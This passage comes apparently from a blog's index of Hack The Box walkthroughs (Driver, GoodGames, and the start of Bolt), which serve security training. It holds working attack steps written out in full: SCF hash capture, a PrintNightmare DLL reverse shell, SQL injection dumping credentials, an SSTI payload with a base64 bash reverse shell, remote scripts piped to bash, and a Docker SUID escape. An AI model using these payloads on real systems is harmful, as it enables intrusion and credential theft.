as: nmap -sC -sV -o nmap/targeted 10.10.11.106 -p 80,135,445,5985 Nmap scan report for 10.10.11.106 Host is up (0.065s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc? 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: |_ start_date: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 52.40 seconds  This machine has ports 80 (HTTP), 135 (MS-RPC), 445 (SMB) and 5985 (WinRM) open.\n$ crackmapexec smb 10.10.11.106 SMB 10.10.11.106 445 DRIVER [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)  Web enumeration If we go to http://10.10.11.106, the website requires authentication:\nIf we test some default credentials (i.e. admin:admin, user:password, etc), we see that admin:admin works:\nHere we find a file upload for a printer firmware:\nThe website says that someone will be checking the uploads manually.\nSCF attack The idea here is to upload a SCF file (Shell Command File). This is a special type of file in Windows that can execute a limited set of commands (for example, open the desktop or a Windows explorer).\nWe can capture an NTLMv2 hash using impacket-smbserver or responder if we tell Windows that the icon for the actual file is stored in a shared folder through SMB.\nHence, this is the SCF file (more information at pentesterlab.blog):\n[Shell] Command = 2 IconFile = \"\\\\10.10.17.44\\smbFolder\\test.ico\" [Taskbar] Command = \"ToggleDesktop\"  Now we start an SMB server using impacket-smbserver:\n$ impacket-smbserver smbFolder $(pwd) -smb2support Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed  And when we upload the file, we capture the NTLMv2 hash from SMB authentication to our attacker machine:\n[*] Incoming connection (10.10.11.106,49519) [*] AUTHENTICATE_MESSAGE (DRIVER\\tony,DRIVER) [*] User DRIVER\\tony authenticated successfully [*] tony::DRIVER:aaaaaaaaaaaaaaaa:5fbf672174a15ff654e2eb36ca408e50:010100000000000080393ee6082bd8014780fc0726c068f2000000000100100047004a006f0062006b004b0071004b000300100047004a006f0062006b004b0071004b000200100068007a004f004f0070007a0053004a000400100068007a004f004f0070007a0053004a000700080080393ee6082bd801060004000200000008003000300000000000000000000000002000006b26bbc466c417cdcf93367aee630e754d28aa6a1d925888d3eaa1a947cb84650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e0034003400000000000000000000000000 [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:SMBFOLDER)  The NTLMv2 hashes are only useful to crack them with john of hashcat using a dictionary attack to get the password (Pass the Hash is not possible). So, let\u0026rsquo;s crack it:\n$ echo 'tony::DRIVER:aaaaaaaaaaaaaaaa:5fbf672174a15ff654e2eb36ca408e50:010100000000000080393ee6082bd8014780fc0726c068f2000000000100100047004a006f0062006b004b0071004b000300100047004a006f0062006b004b0071004b000200100068007a004f004f0070007a0053004a000400100068007a004f004f0070007a0053004a000700080080393ee6082bd801060004000200000008003000300000000000000000000000002000006b26bbc466c417cdcf93367aee630e754d28aa6a1d925888d3eaa1a947cb84650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e0034003400000000000000000000000000' \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Press 'q' or Ctrl-C to abort, almost any other key for status liltony (tony) 1g 0:00:00:00 DONE 5.555g/s 172088p/s 172088c/s 172088C/s one2three..harlan Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably Session completed.  System enumeration Now we can connect to the machine via WinRM using evil-winrm and capture the user.txt flag:\n$ evil-winrm -i 10.10.11.106 -u tony -p liltony Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; type ..\\Desktop\\user.txt 21c0d12a3a866ed742c6be523acf4f24  The name of the machine, its picture and the release date are hints to the attack vector to use. We are going to exploit the printer spooler using PrintNightmare (CVE-2021-1675).\nTo check that the machine is vulnerable, we can use SpoolerScanner. We only need to modify the PowerShell script to enter 10.10.11.106 as the IP address and run it using PowerShell from evil-winrm:\n*Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; IEX(New-Object Net.WebClient).DownloadString('http://10.10.17.44/SpoolerScan.ps1') True  It shows that it is vulnerable. Now we can follow the steps to run PrintNightmare.\nPrintNightmare explotation The exploit requires a specific version of impacket. I will be using Python virtual environments (venv) to avoid uninstalling the default impacket version. These are all the commands I used to setup the environment:\n$ python3 -m venv PrintNightmare $ cd PrintNightmare $ source bin/activate $ git clone https://github.com/cube0x0/impacket $ cd impacket $ pip3 install -r requirements.txt $ python3 setup.py install $ cd ..  Now we need to create a malicious DLL to install it in the machine. We can us msfvenom for that purpose:\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f dll -o rev.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 8704 bytes Saved as: rev.dll  Then we start an SMB server to serve the DLL file:\n$ impacket-smbserver smbFolder $(pwd) -smb2support Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed  Now we download the Python exploit and run it. We need to indicate the name of the server (DRIVER, shown in the nmap output), the credentials found, the IP address and the path to the malicious DLL in the SMB share:\n$ wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py $ python3 CVE-2021-1675.py DRIVER/tony:liltony@10.10.11.106 '\\\\10.10.17.44\\smbFolder\\rev.dll' [*] Connecting to ncacn_np:10.10.11.106[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.17.44\\smbFolder\\rev.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Try 3...  We see that we receive the connection in the SMB server:\n[*] Incoming connection (10.10.11.106,49530) [*] AUTHENTICATE_MESSAGE (\\,DRIVER) [*] User DRIVER\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa  And also a connection as Administrator using nc because the DLL is executed:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.106. Ncat: Connection from 10.10.11.106:49531. Microsoft Windows [Version 10.0.10240] (c) 2015 Microsoft Corporation. All rights reserved. C:\\Windows\\system32whoami nt authority\\system C:\\Windows\\system32type C:\\Users\\Administrator\\Desktop\\root.txt 5408c0d30ba4747363d074210fa3e7f5  ","image":"/images/HTB/Driver/Driver.png","permalink":"https://7rocky.github.io/en/htb/driver/","section":"htb","summary":"Hack The Box. Windows. Easy machine. This machine contains a website with default credentials authentication and a file upload. Here we can upload an SCF to capture the user\u0026rsquo;s NTLMv2 hash and crack it. Then we can exploit PrintNightmare. Windows basic exploitation techniques are needed in order to compromise this machine","time":5,"title":"Driver"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.130   Release: 21 / 02 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.130 -p 80 Nmap scan report for 10.10.11.130 Host is up (0.044s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-title: GoodGames | Community and Store Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.20 seconds  This machine has port 80 (HTTP) open.\nWeb enumeration We can start entering http://10.10.11.130 in the browser and we see this website:\nIt is a page that shows some videogames, although many links are disabled. We can find a \u0026ldquo;blog\u0026rdquo; section:\nBut nothing interesting yet. And also have a login form:\nBypassing authentication One of the first things to try on a login form is SQL injection with a payload like ' or 1=1-- - (in the username/email field). If we do so and enter a random password, we bypass the authentication form and access as admin:\nAt this point, we can access another website at http://internal-administration.goodgames.htb (clicking on the top-right icon). But first we must add internal-administration.goodgames.htb into /etc/hosts:\nWe do not have credentials. We could try SQL injection again, but this time it is not working.\nExploiting SQLi At this point, we can recall that there was a SQL injection on the other site. Using this, we can dump the database and look for potential passwords.\nFirst, let\u0026rsquo;s identify the type of SQLi we have. At the moment, we can use it as Boolean-based (Blind) SQLi, because we login if some condition is true and we get an error if the condition is false:\n$ curl 10.10.11.130/login -sd \"email=' or 1=1-- -\u0026password=x\" | grep error $ curl 10.10.11.130/login -sd \"email=' or 1=2-- -\u0026password=x\" | grep error \u0026lt;h2 class=\"h4\"\u0026gt;Internal server error!\u0026lt;/h2\u0026gt;  This type of SQLi can be used to dump the database contents, but only character by character, so the process will be very slow.\nInstead, we can try to find a Union-based SQLi. For that purpose, we need to add a UNION SELECT statement and see if the server reflects some of our input, until we have the correct number of columns:\n$ curl 10.10.11.130/login -sd \"email=' union select 111-- -\u0026password=x\" | grep -E '111' $ curl 10.10.11.130/login -sd \"email=' union select 111,222-- -\u0026password=x\" | grep -E '111|222' $ curl 10.10.11.130/login -sd \"email=' union select 111,222,333-- -\u0026password=x\" | grep -E '111|222|333' $ curl 10.10.11.130/login -sd \"email=' union select 111,222,333,444-- -\u0026password=x\" | grep -E '111|222|333|444' \u0026lt;h2 class=\"h4\"\u0026gt;Welcome 444\u0026lt;/h2\u0026gt;  And there we have it: the fourth column is being reflected. Now we can list some basic information about the database manager:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,database()-- -\u0026password=x\" | grep Welcome \u0026lt;h2 class=\"h4\"\u0026gt;Welcome main\u0026lt;/h2\u0026gt; $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,version()-- -\u0026password=x\" | grep Welcome \u0026lt;h2 class=\"h4\"\u0026gt;Welcome 8.0.27\u0026lt;/h2\u0026gt; $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,user()-- -\u0026password=x\" | grep Welcome \u0026lt;h2 class=\"h4\"\u0026gt;Welcome main_admin@localhost\u0026lt;/h2\u0026gt;  For convenience, let\u0026rsquo;s use cut and sed in Bash to remove the unwanted results:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,database()-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' main $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,version()-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' 8.0.27 $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,user()-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' main_admin@localhost  Much better. Now we can start dumping values from the database. First of all, we need to enumerate all the available databases (main is the one that is currently in use):\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' information_schema,main  We use GROUP_CONCAT to avoid that multiple rows get printed together. We see that there are two databases (one of them being information_schema), so we only care about main. The next step is enumerate the existing tables in this database:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='main'-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' blog,blog_comments,user  There are three tables. The most interesting one is user because it might contain sensitive information. Now we need to get the column names of this table:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='user'-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' email,id,name,password  As we can see, there are four columns. Let\u0026rsquo;s use CONCAT to join the four columns in one field using spaces (0x20) and list the contents of the first row (LIMIT 1):\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,concat(id,0x20,email,0x20,name,0x20,password) from user limit 1-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' 1 admin@goodgames.htb admin 2b22337f218b2d82dfc3b6f77e7cb8ec  Finding SSTI Now we have a hashed password for user admin. It seems to be an MD5 hash, so we can try to crack it. This time, instead of using a dictionary attack using john or hashcat we will use rainbow tables to get the password in clear text. For example, we can go to CrackStation:\nIf we return to the login form for http://internal-administration.goodgames.htb and use admin:superadministrator as credentials, we get in:\nThe only thing we can do here is change our profile information:\nAt this point, we must take into account that the server is running Python (nmap discovered it). We can see it on the HTTP response headers:\n$ curl -I internal-administration.goodgames.htb HTTP/1.1 302 FOUND Date: Server: Werkzeug/2.0.2 Python/3.6.7 Content-Type: text/html; charset=utf-8 Content-Length: 218 Location: http://internal-administration.goodgames.htb/login  Moreover, we can guess that it is using Flask because the HTTP response status message is in capital letters.\nWith this information, we can try to exploit Jinja2, which is the default template engine for Flask. This attack is known as Server-Side Template Injection (SSTI) and can lead to code execution.\nFirst of all, we need to verify that it is actually vulnerable. We can use a simple payload such as {{7*7}}, and if we see a 49, then it is vulnerable. A picture is worth a thousand words\u0026hellip;\nNow we can transform the SSTI into a Remote Command Execution (RCE) using some of the payloads shown in PayloadsAllTheThings. I will be using this one:\n{{cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read()}}  It contains a reverse shell encoded in Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  If we are listening with nc, we will receive a connection:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.130. Ncat: Connection from 10.10.11.130:56268. bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@3a453ab39d3d:/backend# script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null root@3a453ab39d3d:/backend# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm root@3a453ab39d3d:/backend# export TERM=xterm root@3a453ab39d3d:/backend# export SHELL=bash root@3a453ab39d3d:/backend# stty rows 50 columns 158  System enumeration The first thing to notice is that we are root and the hostname is a bit weird. These are signs that we might be in a Docker container. Furthermore, the IP address is not 10.10.11.130:\nroot@3a453ab39d3d:/backend# ls -la / total 96 drwxr-xr-x 1 root root 4096 Nov 5 15:23 . drwxr-xr-x 1 root root 4096 Nov 5 15:23 .. -rwxr-xr-x 1 root root 0 Nov 5 15:23 .dockerenv drwxr-xr-x 1 root root 4096 Feb 22 21:57 backend drwxr-xr-x 1 root root 4096 Nov 5 15:28 bin drwxr-xr-x 2 root root 4096 Oct 20 2018 boot drwxr-xr-x 5 root root 340 Feb 22 05:32 dev drwxr-xr-x 1 root root 4096 Feb 22 21:29 etc drwxr-xr-x 1 root root 4096 Nov 5 15:23 home drwxr-xr-x 1 root root 4096 Nov 16 2018 lib drwxr-xr-x 2 root root 4096 Nov 12 2018 lib64 drwxr-xr-x 2 root root 4096 Nov 12 2018 media drwxr-xr-x 2 root root 4096 Nov 12 2018 mnt drwxr-xr-x 2 root root 4096 Nov 12 2018 opt dr-xr-xr-x 470 root root 0 Feb 22 05:32 proc drwx------ 1 root root 4096 Feb 22 17:35 root drwxr-xr-x 1 root root 4096 Feb 22 13:19 run drwxr-xr-x 1 root root 4096 Nov 5 15:28 sbin drwxr-xr-x 2 root root 4096 Nov 12 2018 srv dr-xr-xr-x 13 root root 0 Feb 22 13:40 sys drwxrwxrwt 1 root root 4096 Feb 22 21:18 tmp drwxr-xr-x 1 root root 4096 Nov 12 2018 usr drwxr-xr-x 1 root root 4096 Nov 12 2018 var root@3a453ab39d3d:/backend# ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 5: eth0@if6: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0 valid_lft forever preferred_lft forever  We see a .dockerenv at the root directory and our IP address is 172.19.0.2.\nThe host machine is likely to have a network interface with IP address 172.19.0.1. Let\u0026rsquo;s confirm it:\nroot@3a453ab39d3d:/backend# ping -c 1 172.19.0.1 PING 172.19.0.1 (172.19.0.1) 56(84) bytes of data. 64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.041 ms --- 172.19.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.041/0.041/0.041/0.000 ms  Ok, now let\u0026rsquo;s perform a port scan from the container using a simple script in Bash as the following:\n#!/usr/bin/env bash for p in `seq 1 65535`; do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/172.19.0.1/$p \u0026amp;\u0026amp; echo \"Port $p open\" \u0026amp; done; wait  We must do it because the machine only exposed port 80, but we don\u0026rsquo;t know whether it has more ports open and exposed on internal networks.\nWe can serve the script using a Python HTTP server and pipe it to Bash:\nroot@3a453ab39d3d:/backend# curl -s 10.10.17.44/port-scan.sh | bash Port 22 open Port 80 open  And we have SSH enabled on the machine. Let\u0026rsquo;s see if we find some usernames inside the container:\nroot@3a453ab39d3d:/backend# ls /home augustus  There it is, now we can try to reuse the password we found before:\nroot@3a453ab39d3d:/backend# ssh augustus@172.19.0.1 augustus@172.19.0.1's password: augustus@GoodGames:~$ cat user.txt ddbe9ee6b6856ae9e700f72fc2d3052b  Privilege escalation Wait a moment, we saw /home/augustus inside the container. That\u0026rsquo;s weird, let\u0026rsquo;s get back to the container and see if augustus is actually user:\nroot@3a453ab39d3d:/backend# grep sh$ /etc/passwd root:x:0:0:root:/root:/bin/bash root@3a453ab39d3d:/backend# grep augustus /etc/passwd  It is not, the only user inside the container is root. Hence, the container has a volume mount from the host machine (i.e. /home/augustus). We can check it using df or mount:\nroot@3a453ab39d3d:/backend# df -h Filesystem Size Used Avail Use% Mounted on overlay 6.3G 5.9G 60M 100% / tmpfs 64M 0 64M 0% /dev tmpfs 2.0G 0 2.0G 0% /sys/fs/cgroup /dev/sda1 6.3G 5.9G 60M 100% /home/augustus shm 64M 0 64M 0% /dev/shm tmpfs 2.0G 0 2.0G 0% /proc/acpi tmpfs 2.0G 0 2.0G 0% /sys/firmware root@3a453ab39d3d:/backend# mount | grep augustus /dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)  Nice, now the idea is to copy /bin/bash from the machine to /home/augustus as the user augustus and change its owner and permissions to enable SUID from the container (as root):\nroot@3a453ab39d3d:/backend# ssh augustus@172.19.0.1 augustus@172.19.0.1's password: augustus@GoodGames:~$ cp /bin/bash . augustus@GoodGames:~$ ls bash user.txt augustus@GoodGames:~$ exit logout Connection to 172.19.0.1 closed. root@3a453ab39d3d:/backend# chown root:root /home/augustus/bash root@3a453ab39d3d:/backend# chmod 4755 /home/augustus/bash root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1 augustus@172.19.0.1's password: augustus@GoodGames:~$ ls bash user.txt  Now we only need to execute bash from the current directory using -p to use the SUID privilege:\naugustus@GoodGames:~$ ./bash -p bash-5.1# cat /root/root.txt 075cbfa6e2f8a12e8024c7b1b08a4909  In addition, all the steps to compromise the machine were written into a Python script called autopwn.py (detailed explanation here):\n$ python3 autopwn.py $WORDLISTS/rockyou.txt 10.10.17.44 4444 [*] Found database: main [*] Found tables: blog,blog_comments,user. Using: user [*] Found columns: email,id,name,password. Using: name,password [+] Found hashed password for \"admin\": 2b22337f218b2d82dfc3b6f77e7cb8ec [+] Cracking hash: superadministrator [*] Got CSRF token: IjJmM2FhN2M5NmQyNzMxMDYwYWUxNGRhODE2YThmNzkxYzY1YTdiZGQi.Yhdd1A.EFHJgaw43_YSRoK4TcJcKW0V098 [+] Trying to bind to :: on port 4444: Done [+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.11.130 on port 58366 [*] Using reverse shell: bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261 [*] Using SSTI payload: {{cycler.__init__.__globals__.os.popen(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\").read()}} [*] Found user: augustus [*] Connected to container at: 172.19.0.2 [*] SSH to 172.19.0.1 using credentials \"augustus:superadministrator\" [+] user.txt: b26a4127cbfb7a1bcbf8e59b1e864a77 [+] root.txt: c682307c4267caea83431507bad0819c [*] Set: alias bash=\"/home/augustus/bash -p\" [*] Using reverse shell: bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4445 0\u0026gt;\u00261 [+] Trying to bind to :: on port 4445: Done [+] Waiting for connections on :::4445: Got connection from ::ffff:10.10.11.130 on port 45680 [*] Switching to interactive mode bash-5.1#  ","image":"/images/HTB/GoodGames/GoodGames.png","permalink":"https://7rocky.github.io/en/htb/goodgames/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has website that is vulnerable to SQL injection where we can extract a password to access an internal website that is vulnerable to SSTI. Then, we get access to a Docker container that mounts a directory from the machine, so that we can abuse it to escalate privileges. Basic web exploitation skills and Docker breakout techniques are needed in order to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch","time":10,"title":"GoodGames"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.114   Release: 25 / 09 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.114 -p 22,80,443 Nmap scan report for 10.10.11.114 Host is up (0.038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Starter Website - About |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 16.23 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 443 (HTTPS) open.\nMoreover, we see that the server is possibly using virtual hosts (listed in the SSL certificate), so we can put domains bolt.htb and passbolt.bolt.htb into /etc/hosts.\nEnumeration If we go to http://bolt.htb we will see the following website:\nHere we have also a login page:\nBut we do not have any potential credentials. Although there is a register page, when submitting the form, the server returns 500 Internal Server Error, so the functionality might be disabled.\nFrom the response, we can guess that the server is running Flask:\n$ curl bolt.htb/register -vd 'username=asdf\u0026email=asdf%40bolt.htb\u0026password=asdf' * Trying 10.10.11.114:80... * Connected to bolt.htb (10.10.11.114) port 80 (#0) \u0026gt; POST /register HTTP/1.1 \u0026gt; Host: bolt.htb \u0026gt; User-Agent: curl/7.79.1 \u0026gt; Accept: */* \u0026gt; Content-Type: application/x-www-form-urlencoded \u0026gt; Content-Length: 49 \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 500 INTERNAL SERVER ERROR \u0026lt; Server: nginx/1.18.0 (Ubuntu) \u0026lt; Date: \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 290 \u0026lt; Connection: keep-alive \u0026lt; \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.\u0026lt;/p\u0026gt; * Connection #0 to host bolt.htb left intact  This is because Flask puts the HTTP response status in capital letters (i.e. HTTP/1.1 500 INTERNAL SERVER ERROR).\nThe second subdomain we have is passbolt.bolt.htb, but we cannot do anything here:\nInspecting the Docker image There is a Docker image we can download from bolt.htb in a TAR file (image.tar):\nWe can import the image to Docker the following way:\n$ docker image load -i image.tar 3fc64803ca2d: Loading layer [==================================================\u0026gt;] 4.463MB/4.463MB 73f2f98bc222: Loading layer [==================================================\u0026gt;] 7.68kB/7.68kB 8f2df5d06a26: Loading layer [==================================================\u0026gt;] 62.86MB/62.86MB a1e4f9dc4110: Loading layer [==================================================\u0026gt;] 57.57MB/57.57MB f0c4120bc314: Loading layer [==================================================\u0026gt;] 29.79MB/29.79MB 14ec2ed1c30d: Loading layer [==================================================\u0026gt;] 6.984MB/6.984MB 68c03965721f: Loading layer [==================================================\u0026gt;] 3.072kB/3.072kB fec67b58fd48: Loading layer [==================================================\u0026gt;] 19.97kB/19.97kB 7fa1531c7420: Loading layer [==================================================\u0026gt;] 7.168kB/7.168kB e45bbea785e3: Loading layer [==================================================\u0026gt;] 15.36kB/15.36kB ac16908b339d: Loading layer [==================================================\u0026gt;] 8.192kB/8.192kB Loaded image: flask-dashboard-adminlte_appseed-app:latest $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE flask-dashboard-adminlte_appseed-app latest 859e74798e6c 6 months ago 154MB  Now we can run the image inside a container:\n$ docker run --rm -p 5005:5005 -it flask-dashboard-adminlte_appseed-app [2021-10-13 08:44:27 +0000] [1] [DEBUG] Current configuration: config: gunicorn-cfg.py bind: ['0.0.0.0:5005'] ... [2021-10-13 08:44:27 +0000] [1] [INFO] Starting gunicorn 20.0.4 [2021-10-13 08:44:27 +0000] [1] [DEBUG] Arbiter booted [2021-10-13 08:44:27 +0000] [1] [INFO] Listening at: http://0.0.0.0:5005 (1) [2021-10-13 08:44:27 +0000] [1] [INFO] Using worker: sync [2021-10-13 08:44:27 +0000] [15] [INFO] Booting worker with pid: 15 [2021-10-13 08:44:27 +0000] [1] [DEBUG] 1 workers [2021-10-13 08:44:29,656] INFO in run: DEBUG = True [2021-10-13 08:44:29,656] INFO in run: Environment = Debug [2021-10-13 08:44:29,657] INFO in run: DBMS = sqlite:////db.sqlite3  We can see that the image is running a Flask server on port 5005 inside the container (after running it the first time, then we add parameter -p 5005:5005 to the docker run command).\nIt is hosting a website that redirects to a login form:\nThis time, we are able to register a new account and enter to AdminLTE 3:\nThere is nothing interesting in this dashboard. Now that the Docker container is running, we can execute sh, to see if there are interesting files:\n$ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ffd733413c3e flask-dashboard-adminlte_appseed-app \"gunicorn --config g…\" 2 minutes ago Up 2 minutes 0.0.0.0:5005-5005/tcp friendly_mcnulty $ docker exec -it ffd733413c3e sh / # ls -la total 108 drwxr-xr-x 1 root root 4096 Oct 13 08:44 . drwxr-xr-x 1 root root 4096 Oct 13 08:44 .. -rwxr-xr-x 1 root root 0 Oct 13 08:44 .dockerenv -rw-r--r-- 1 root root 142 Mar 5 2021 .env drwxr-xr-x 2 root root 4096 Mar 5 2021 __pycache__ drwxr-xr-x 1 root root 4096 Mar 5 2021 app drwxr-xr-x 2 root root 4096 Mar 6 2019 bin -rw-r--r-- 1 root root 1448 Mar 5 2021 config.py -rw-r--r-- 1 root root 16384 Oct 13 08:55 db.sqlite3 drwxr-xr-x 5 root root 360 Oct 13 08:44 dev drwxr-xr-x 1 root root 4096 Oct 13 08:44 etc -rw-r--r-- 1 root root 198 Mar 5 2021 gunicorn-cfg.py drwxr-xr-x 2 root root 4096 Mar 6 2019 home drwxr-xr-x 1 root root 4096 Mar 6 2019 lib drwxr-xr-x 5 root root 4096 Mar 6 2019 media drwxr-xr-x 2 root root 4096 Mar 6 2019 mnt 